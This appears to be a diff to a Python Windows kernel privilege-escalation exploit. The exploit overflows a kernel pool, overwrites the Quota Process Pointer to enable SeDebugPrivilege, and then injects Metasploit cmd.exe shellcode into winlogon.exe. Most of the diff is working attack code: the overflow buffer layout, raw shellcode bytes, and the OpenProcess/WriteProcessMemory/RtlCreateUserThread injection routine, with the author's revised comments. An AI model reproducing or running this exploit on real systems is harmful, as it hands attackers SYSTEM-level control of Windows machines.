@@ -34,7 +34,9 @@ Timeline:
 Exploitation:
 =============
 
-This exploit uses a data only attack via the Quota Process Pointer Overwrite technique. We smash the token and dec a controlled address by 0x50 (size of the Mutant) to enable SeDebugPrivilege's. Then we inject code into a system process.
+This exploit uses a data only attack via the Quota Process Pointer Overwrite technique. We smash the token's _SEP_TOKEN_PRIVILEGES->Enabled and dec the controlled address by 0x50 (size of the Mutant) to enable SeDebugPrivilege's. Then we inject code into a system process.
+
+Note that this exploit doesn't use any kernel mode shellcode :->
 
 References:
 ===========
@@ -222,11 +224,10 @@ def alloc_pool_overflow_buffer(base, input_size):
     print "(+) allocating pool overflow input buffer"
     baseadd   = c_int(base)
     size = c_int(input_size)
+    priv = token + 0x40 + 0x8                  # Enabled
 
     input  = struct.pack("<I", 0x0000001a)     # size
     input += "\x44" * 0x398                    # offset to overflown chunks
-
-    priv = token + 0x40 + 0x8                  # Enabled
     
     # patch
     input += struct.pack("<I", 0x040a008c)     # _POOL_HEADER
@@ -235,13 +236,13 @@ def alloc_pool_overflow_buffer(base, input_size):
     input += struct.pack("<I", 0x00000000)
     input += struct.pack("<I", 0x00000001)
     input += "\x44" * 0x20
-    input += struct.pack("<I", 0x00000001)
+    input += struct.pack("<I", 0x00000001)     # set @ecx to 0x1, to write another 0x4 dwords
     input += struct.pack("<I", 0x00000000)
     input += "\x44" * 8
     input += struct.pack("<I", 0x00000001)
     input += struct.pack("<I", 0x00000001)
     input += "\x44" * 4
-    input += struct.pack("<I", 0x0008000e)
+    input += struct.pack("<I", 0x0008000e)     # restore the TypeIndex ;-)
     input += struct.pack("<I", priv)           # Quota Process Pointer Overwrite
 
     # filler
@@ -354,33 +355,41 @@ def we_can_leak_token():
 
 def trigger_lpe():
     """
-    This function frees the IoCompletionReserve objects and this triggers the 
-    registered aexit, which is our controlled pointer to OkayToCloseProcedure.
+    This function frees the Mutant objects and this triggers the 
+    usage of the Quota Process Pointer, dec'ing by 0x50, avoiding OkayToCloseProcedure.
     """
-    # free the corrupted chunk to trigger OkayToCloseProcedure
+
     # we dont know where the free chunk is, we just know its in one of the pages 
-    # full of Mutants and that its the 2nd chunk after the overflowed buffer.
+    # full of Mutants and that its the 2nd chunk after the overflowed buffer. Good enough.
     for v in to_free:
         kernel32.CloseHandle(v)
 
 def get_winlogin_pid():
+    """
+    Just gets winlogon pid. Get whateva system pid you want
+    """
     for proc in psutil.process_iter():
-
-        # choose whateva system process
         if proc.name() == "winlogon.exe":
             return proc.pid
     return 0
 
 def we_can_inject():
+    """
+    Now that we have the SeDebugPrivilege, we can inject into a system process.
+    I choose winlogon because you get the bonus GUI.
+    """
     page_rwx_value = 0x40
-    process_all = 0x1F0FFF
-    memcommit = 0x00001000
-    process_handle = windll.kernel32.OpenProcess(process_all, False, get_winlogin_pid()) # WinLogin
-    if process_handle == 0:
-        return False
-    print "(+) got a handle to winlogon! 0x%x" % process_handle
+    process_all    = 0x1f0fff
+    memcommit      = 0x00001000
+    hThread        = HANDLE()
 
-    # metasploit EXITFUNC=Thread
+    # get a handle to the process
+    pHandle = windll.kernel32.OpenProcess(process_all, False, get_winlogin_pid())
+    if pHandle == 0:
+        return False
+    print "(+) got a handle to winlogon! 0x%x" % pHandle
+
+    # metasploit windows/exec CMD=cmd.exe EXITFUNC=Thread
     buf =  ""
     buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
     buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
@@ -398,13 +407,16 @@ def we_can_inject():
     buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
     buf += "\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"
 
-    shellcode_length = len(buf)
-    hThread = HANDLE()
-    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
-    print "(+) allocated shellcode in winlogon @ 0x%x" % memory_allocation_variable
-    res = windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, buf, shellcode_length, 0)
+    # allocate some memory in the process
+    fPointer = windll.kernel32.VirtualAllocEx(pHandle, 0, len(buf), memcommit, page_rwx_value)
+    print "(+) allocated shellcode in winlogon @ 0x%x" % fPointer
+
+    # write the shellcode to the memory
+    res = windll.kernel32.WriteProcessMemory(pHandle, fPointer, buf, len(buf), 0)
     print "(+) WriteProcessMemory returned: 0x%x" % res
-    res = windll.ntdll.RtlCreateUserThread(process_handle, None, 0, 0, 0, 0, memory_allocation_variable, 0, byref(hThread), 0)
+
+    # create a new thread that starts execution at that code location
+    res = windll.ntdll.RtlCreateUserThread(pHandle, None, 0, 0, 0, 0, fPointer, 0, byref(hThread), 0)
     print "(+) RtlCreateUserThread returned: 0x%x" % res
     return True
 
